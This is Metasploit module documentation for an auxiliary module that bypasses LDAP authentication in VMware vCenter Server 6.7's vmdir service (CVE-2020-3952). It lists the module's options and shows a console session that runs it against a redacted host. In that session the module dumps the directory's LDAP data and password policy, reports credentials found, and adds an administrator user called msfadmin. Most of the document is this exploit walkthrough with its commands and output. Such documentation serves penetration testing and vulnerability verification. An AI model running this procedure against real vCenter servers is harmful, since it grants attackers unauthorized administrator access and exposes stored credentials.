## Vulnerable Application

### Description

This module bypasses LDAP authentication in VMware vCenter Server's
vmdir service to add an arbitrary administrator user. Version 6.7
prior to the 6.7U3f update is vulnerable, only if upgraded from a
previous release line, such as 6.0 or 6.5.

### Setup

Tested in the wild. No setup notes available at this time, as setup will
be specific to target environment.

## Verification Steps

Follow [Setup](#setup) and [Scenarios](#scenarios).

## Actions

### Add

Add an admin user to the vCenter Server.

## Options

### BASE_DN

If you already have the LDAP base DN, you may set it in this option.

### USERNAME

Set this to the username for the new admin user.

### PASSWORD

Set this to the password for the new admin user.

## Scenarios

### VMware vCenter Server 6.7 virtual appliance on ESXi

```
msf5 > use auxiliary/admin/ldap/vmware_vcenter_vmdir_auth_bypass
msf5 auxiliary(admin/ldap/vmware_vcenter_vmdir_auth_bypass) > options

Module options (auxiliary/admin/ldap/vmware_vcenter_vmdir_auth_bypass):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   BASE_DN                    no        LDAP base DN if you already have it
   PASSWORD                   no        Password of admin user to add
   RHOSTS                     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT     636              yes       The target port
   SSL       true             no        Enable SSL on the LDAP connection
   USERNAME                   no        Username of admin user to add


Auxiliary action:

   Name  Description
   ----  -----------
   Add   Add an admin user


msf5 auxiliary(admin/ldap/vmware_vcenter_vmdir_auth_bypass) > set rhosts [redacted]
rhosts => [redacted]
msf5 auxiliary(admin/ldap/vmware_vcenter_vmdir_auth_bypass) > set username msfadmin
username => msfadmin
msf5 auxiliary(admin/ldap/vmware_vcenter_vmdir_auth_bypass) > set password msfadmin
password => msfadmin
msf5 auxiliary(admin/ldap/vmware_vcenter_vmdir_auth_bypass) > run
[*] Running module against [redacted]
not verifying SSL hostname of LDAPS server '[redacted]:636'

[*] Using auxiliary/gather/vmware_vcenter_vmdir_ldap as check
[*] Discovering base DN automatically
[*] Searching root DSE for base DN
dn: cn=DSE Root
namingcontexts: dc=vsphere,dc=local
supportedcontrol: 1.3.6.1.4.1.4203.1.9.1.1
supportedcontrol: 1.3.6.1.4.1.4203.1.9.1.2
supportedcontrol: 1.3.6.1.4.1.4203.1.9.1.3
supportedcontrol: 1.2.840.113556.1.4.417
supportedcontrol: 1.2.840.113556.1.4.319
supportedldapversion: 3
supportedsaslmechanisms: GSSAPI

[+] Discovered base DN: dc=vsphere,dc=local
[*] Dumping LDAP data from vmdir service at [redacted]:636
[+] [redacted]:636 is vulnerable to CVE-2020-3952
[*] Storing LDAP data in loot
[+] Saved LDAP data to /Users/wvu/.msf4/loot/20200417002255_default_[redacted]_VMwarevCenterS_975097.txt
[*] Password and lockout policy:
vmwpasswordchangeautounlockintervalsec: [redacted]
vmwpasswordchangefailedattemptintervalsec: [redacted]
vmwpasswordchangemaxfailedattempts: [redacted]
vmwpasswordlifetimedays: [redacted]
vmwpasswordmaxidenticaladjacentchars: [redacted]
vmwpasswordmaxlength: [redacted]
vmwpasswordminalphabeticcount: [redacted]
vmwpasswordminlength: [redacted]
vmwpasswordminlowercasecount: [redacted]
vmwpasswordminnumericcount: [redacted]
vmwpasswordminspecialcharcount: [redacted]
vmwpasswordminuppercasecount: [redacted]
vmwpasswordprohibitedpreviouscount: [redacted]

[+] Credentials found: [redacted]
[snip]
[*] Bypassing LDAP auth in vmdir service at [redacted]:636
[*] Adding admin user msfadmin with password msfadmin
[+] Added user msfadmin, so auth bypass was successful!
[+] Added user msfadmin to admin group
[*] Auxiliary module execution completed
msf5 auxiliary(admin/ldap/vmware_vcenter_vmdir_auth_bypass) >
```
